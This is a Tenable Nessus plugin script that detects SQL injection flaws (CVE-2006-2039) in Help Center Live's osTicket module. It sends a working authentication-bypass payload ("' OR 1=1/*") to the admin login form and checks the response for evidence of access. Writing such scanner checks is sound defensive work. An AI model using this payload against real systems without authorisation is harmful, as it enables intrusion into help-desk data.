#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21306);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2039");
  script_bugtraq_id(17676);

  script_name(english:"Help Center Live osTicket Module Multiple SQL Injection Vulnerabilities");
  script_summary(english:"Tries to bypass authentication with a SQL injection attack");

  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
multiple SQL injection attacks. 

Description :

The remote host is running Help Center Live, an open-source, web-based
help desk application written in PHP. 

The version of Help Center Live installed on the remote host contains
a version of osTicket that is affected by multiple SQL injection
issues.  An unauthenticated attacker may be able to leverage these
flaws to disclose sensitive information, modify data, bypass
authentication, or launch attacks against the underlying database. 

See also :

http://sourceforge.net/project/shownotes.php?release_id=411859

Solution :

Upgrade to Help Center Live version 2.1.0 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/helpcenterlive", "/hcl", "/helpcenter", "/live", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to gain admin access.
  url = string(dir, "/module.php?module=osTicket&file=/modules/osTicket/admin.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like HCL w/ osTicket...
  if (egrep(pattern:'<input .*name="login_user"', string:res))
  {
    postdata = string(
      "login_user=", SCRIPT_NAME, "'+OR+1=1/*&",
      "login_pass=", unixtime(), "&",
      "submit=Log in"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see a header for open tickets.
    if ("<b>Open Tickets</b>" >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
